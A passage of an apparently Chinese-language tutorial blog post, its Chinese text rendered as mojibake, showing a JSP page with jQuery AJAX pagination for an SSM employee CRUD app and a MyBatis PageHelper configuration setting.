class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-</span></span><br><span class="line"><span class="ruby">    webè·¯å¾„ï¼š</span></span><br><span class="line"><span class="ruby">        ä¸ä»¥/å¼€å§‹çš„ç›¸å¯¹è·¯å¾„ï¼Œæ‰¾èµ„æºï¼Œä»¥å½“å‰èµ„æºçš„è·¯å¾„ä¸ºåŸºå‡†ï¼Œç»å¸¸å®¹æ˜“å‡ºç°é—®é¢˜</span></span><br><span class="line"><span class="ruby">        ä»¥/å¼€å§‹çš„ç›¸å¯¹è·¯å¾„ï¼Œæ‰¾èµ„æºï¼Œä»¥æœåŠ¡å™¨çš„è·¯å¾„ä¸ºæ ‡å‡†ï¼ˆ<span class="symbol">http:</span>/<span class="regexp">/localhost:3306ï¼‰éœ€è¦åŠ ä¸Šé¡¹ç›®å</span></span></span><br><span class="line"><span class="ruby">            <span class="symbol">http:</span>/<span class="regexp">/localhost:3306/crud</span></span></span><br><span class="line"><span class="ruby">-</span><span class="xml">-%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ taglib uri=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> prefix=<span class="string">"c"</span></span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>å‘˜å·¥åˆ—è¡¨<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="ruby">        pageContext.setAttribute(<span class="string">"APP_PATH"</span>,request.getContextPath());</span></span><br><span class="line"><span class="ruby">    </span><span class="xml">%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/js/jquery-3.5.1.min.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æ ‡é¢˜-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>SSM-CRUD<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æŒ‰é’®-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-4 col-md-offset-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>æ–°å¢<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger"</span>&gt;</span>åˆ é™¤<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æ˜¾ç¤ºè¡¨æ ¼æ•°æ®-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table table-hover"</span> <span class="attr">id</span>=<span class="string">"emps_table"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>#<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>email<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>æ“ä½œ<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                    å‘˜å·¥æ•°æ®ç­‰-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æ˜¾ç¤ºåˆ†é¡µä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            åˆ†é¡µæ–‡å­—ä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span> <span class="attr">id</span>=<span class="string">"page_info_area"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            æ˜¾ç¤ºé¡µç ç­‰ä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            åˆ†é¡µæ¡ä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span> <span class="attr">id</span>=<span class="string">"page_nav_area"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            æ˜¾ç¤ºåˆ†é¡µæ¡ä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    //1.é¡µé¢åŠ è½½å®Œæˆä»¥åï¼Œç›´æ¥å»å‘é€ä¸€ä¸ªajaxè¯·æ±‚ï¼Œè¦åˆ°åˆ†é¡µæ•°æ®</span></span><br><span class="line"><span class="xml">    $(function ()&#123;</span></span><br><span class="line"><span class="xml">        //å»é¦–é¡µ</span></span><br><span class="line"><span class="xml">        to_page(1);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"><span class="xml">    </span></span><br><span class="line"><span class="xml">    function to_page(pn) &#123;</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">            url:"$&#123;APP_PATH&#125;/emps",</span></span><br><span class="line"><span class="xml">            data:"pn="+pn,</span></span><br><span class="line"><span class="xml">            type:"GET",</span></span><br><span class="line"><span class="xml">            success:function (result)&#123;</span></span><br><span class="line"><span class="xml">                // console.log(result);</span></span><br><span class="line"><span class="xml">                //1.è§£æå¹¶æ˜¾ç¤ºå‘˜å·¥æ•°æ®</span></span><br><span class="line"><span class="xml">                build_emps_tables(result);</span></span><br><span class="line"><span class="xml">                //2.è§£æå¹¶æ˜¾ç¤ºåˆ†é¡µä¿¡æ¯</span></span><br><span class="line"><span class="xml">                build_page_info(result);</span></span><br><span class="line"><span class="xml">                //3.è§£æå¹¶æ˜¾ç¤ºåˆ†é¡µæ¡æ•°æ®</span></span><br><span class="line"><span class="xml">                build_page_nav(result);</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    function build_emps_tables(result) &#123;</span></span><br><span class="line"><span class="xml">        //æ¸…ç©ºtable</span></span><br><span class="line"><span class="xml">        $("#emps_table tbody").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        var emps=result.extend.pageInfo.list;</span></span><br><span class="line"><span class="xml">        $.each(emps,function (index,item) &#123;</span></span><br><span class="line"><span class="xml">            var empIdTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empId);</span></span><br><span class="line"><span class="xml">            var empNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empName);</span></span><br><span class="line"><span class="xml">            var genderTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.gender=='M'?"ç”·":"å¥³");</span></span><br><span class="line"><span class="xml">            var emailTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.email);</span></span><br><span class="line"><span class="xml">            var deptNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.department.deptName);</span></span><br><span class="line"><span class="xml">            /**</span></span><br><span class="line"><span class="xml">             * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-pencil"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">             ç¼–è¾‘</span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">             */</span></span><br><span class="line"><span class="xml">            var editBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-primary btn-sm")</span></span><br><span class="line"><span class="xml">                .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-pencil")).append("ç¼–è¾‘");</span></span><br><span class="line"><span class="xml">            /**</span></span><br><span class="line"><span class="xml">             * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-trash"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span> /&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">             åˆ é™¤</span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">             */</span></span><br><span class="line"><span class="xml">            var delBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-danger btn-sm")</span></span><br><span class="line"><span class="xml">                .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-trash")).append("åˆ é™¤");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">            var btnTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(editBtn).append(" ").append(delBtn);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">            //appendæ–¹æ³•æ‰§è¡Œå®Œæˆä¹‹åè¿˜æ˜¯è¿”å›åŸæ¥çš„å…ƒç´ </span></span><br><span class="line"><span class="xml">            $("<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span>").append(empIdTd)</span></span><br><span class="line"><span class="xml">                .append(empNameTd)</span></span><br><span class="line"><span class="xml">                .append(genderTd)</span></span><br><span class="line"><span class="xml">                .append(emailTd)</span></span><br><span class="line"><span class="xml">                .append(deptNameTd)</span></span><br><span class="line"><span class="xml">                .append(btnTd)</span></span><br><span class="line"><span class="xml">                .appendTo("#emps_table tbody")</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">    //è§£ææ˜¾ç¤ºåˆ†é¡µä¿¡æ¯</span></span><br><span class="line"><span class="xml">    function build_page_info(result)&#123;</span></span><br><span class="line"><span class="xml">        //æ¸…ç©ºåˆ†é¡µä¿¡æ¯</span></span><br><span class="line"><span class="xml">        $("#page_info_area").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        $("#page_info_area").append("å½“å‰"+result.extend.pageInfo.pageNum+"é¡µ,æ€»"</span></span><br><span class="line"><span class="xml">            +result.extend.pageInfo.pages+"é¡µ,æ€»"</span></span><br><span class="line"><span class="xml">            +result.extend.pageInfo.total+"æ¡è®°å½•");</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">    //è§£ææ˜¾ç¤ºåˆ†é¡µæ¡,ç‚¹å‡»åˆ†é¡µè¦èƒ½å»ä¸‹ä¸€é¡µç­‰ç­‰....</span></span><br><span class="line"><span class="xml">    function build_page_nav(result) &#123;</span></span><br><span class="line"><span class="xml">        //æ¸…ç©º</span></span><br><span class="line"><span class="xml">        $("#page_nav_area").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //page_nav_area</span></span><br><span class="line"><span class="xml">        var ul = $("<span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span>").addClass("pagination");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //æ„å»ºå…ƒç´ </span></span><br><span class="line"><span class="xml">        var firstPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("é¦–é¡µ").attr("href","#"));</span></span><br><span class="line"><span class="xml">        var prePageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("&amp;laquo;"));</span></span><br><span class="line"><span class="xml">        if(result.extend.pageInfo.hasPreviousPage == false)&#123;</span></span><br><span class="line"><span class="xml">            firstPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">            prePageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            //ä¸ºå…ƒç´ æ·»åŠ ç‚¹å‡»ç¿»é¡µçš„äº‹ä»¶</span></span><br><span class="line"><span class="xml">            firstPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            prePageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pageNum-1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //æ„å»ºå…ƒç´ </span></span><br><span class="line"><span class="xml">        var nextPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("&amp;raquo;"));</span></span><br><span class="line"><span class="xml">        var lastPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("æœ«é¡µ").attr("href","#"));</span></span><br><span class="line"><span class="xml">        if(result.extend.pageInfo.hasNextPage == false)&#123;</span></span><br><span class="line"><span class="xml">            nextPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">            lastPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            //ä¸ºå…ƒç´ æ·»åŠ ç‚¹å‡»ç¿»é¡µçš„äº‹ä»¶</span></span><br><span class="line"><span class="xml">            nextPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pageNum+1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            lastPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pages);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //æ·»åŠ é¦–é¡µå’Œå‰ä¸€é¡µçš„æç¤º</span></span><br><span class="line"><span class="xml">        ul.append(firstPageLi).append(prePageLi);</span></span><br><span class="line"><span class="xml">        //1,2,3....éå†ç»™ulä¸­æ·»åŠ é¡µç æç¤º</span></span><br><span class="line"><span class="xml">        $.each(result.extend.pageInfo.navigatepageNums,function (index,item) &#123;</span></span><br><span class="line"><span class="xml">            var numLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append(item));</span></span><br><span class="line"><span class="xml">            if(result.extend.pageInfo.pageNum == item)&#123;</span></span><br><span class="line"><span class="xml">                numLi.addClass("active");</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">            numLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(item);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            ul.append(numLi);</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">        //æ·»åŠ åä¸€é¡µå’Œæœ«é¡µçš„æç¤º</span></span><br><span class="line"><span class="xml">        ul.append(nextPageLi).append(lastPageLi);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //æŠŠulåŠ å…¥åˆ°navå…ƒç´ ä¸­</span></span><br><span class="line"><span class="xml">        var navEle = $("<span class="tag">&lt;<span class="name">nav</span>&gt;</span><span class="tag">&lt;/<span class="name">nav</span>&gt;</span>").append(ul);</span></span><br><span class="line"><span class="xml">        navEle.appendTo("#page_nav_area");</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>å¯ä»¥çœ‹åˆ°ä»£ç ä¸­æœ‰æ¸…ç©ºçš„æ“ä½œï¼Œè¿™æ˜¯ä¸ºäº†é˜²æ­¢ç‚¹å‡»ä¸‹ä¸€é¡µçš„æ—¶å€™å¯¼è‡´æ ·å¼é‡å </p><p>ä½†æ˜¯è¿™æ ·å†™å½“ç‚¹å‡»å‰ä¸€é¡µæˆ–åä¸€é¡µæ—¶ï¼Œåˆ°é¦–é¡µæˆ–æœ«é¡µï¼Œé¡µç ä¾æ—§ä¼šå‘åç§»åŠ¨ï¼Œè¿™æ˜¯ä¸å¸Œæœ›çœ‹åˆ°çš„ï¼Œæ‰€ä»¥å°±éœ€è¦åˆ©ç”¨pageHelperä¸­çš„reasonableï¼Œæ¥åˆç†åŒ–<br>mybatisé…ç½®æ–‡ä»¶ä¸­ä¿®æ”¹<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- com.github.pagehelperä¸ºPageHelperç±»æ‰€åœ¨åŒ…å --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span> <span class="attr">interceptor</span>=<span class="string">"com.github.pagehelper.PageInterceptor"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            åˆ†é¡µåˆç†åŒ–--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"reasonable"</span> <span class="attr">value</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br></pre></td></tr></table></figure><br>è¿™æ ·æ’ä»¶å°±è‡ªåŠ¨å¸®æˆ‘ä»¬å®Œæˆäº†åˆç†åŒ–æ“ä½œ</p><h1 id="æ–°å¢åŠŸèƒ½"><a href="#æ–°å¢åŠŸèƒ½" class="headerlink" title="æ–°å¢åŠŸèƒ½"></a>æ–°å¢åŠŸèƒ½</h1><ol><li><p>åœ¨index.jspé¡µé¢ç‚¹å‡»æ–°å¢</p></li><li><p>å¼¹å‡ºæ–°å¢å¯¹è¯æ¡†</p></li><li><p>å»æ•°æ®åº“æŸ¥è¯¢éƒ¨é—¨åˆ—è¡¨ï¼Œæ˜¾ç¤ºåœ¨å¯¹è¯æ¡†ä¸­</p></li><li><p>ç”¨æˆ·è¾“å…¥æ•°æ®å®Œæˆä¿å­˜</p></li></ol><p>æ‰“å¼€bootstarpçš„ <a href="https://v3.bootcss.com/javascript/#modals" target="_blank" rel="noopener">JavaScriptæ’ä»¶</a> 